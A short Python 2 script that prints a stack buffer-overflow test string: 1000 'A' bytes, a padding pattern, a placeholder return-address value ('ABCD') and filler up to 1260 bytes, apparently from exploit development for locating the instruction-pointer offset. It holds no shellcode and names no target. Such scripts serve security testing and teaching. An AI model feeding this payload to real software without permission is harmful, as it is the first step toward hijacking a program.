#!/usr/bin/python2
prefix = 'A' * 1000
padding1 = '000102030405060708091011121314151617'
eip = '\x41\x42\x43\x44'
padding2 = 'X' * (1260 - 1000 - len(padding1) -4)

print prefix + padding1 + eip + padding2
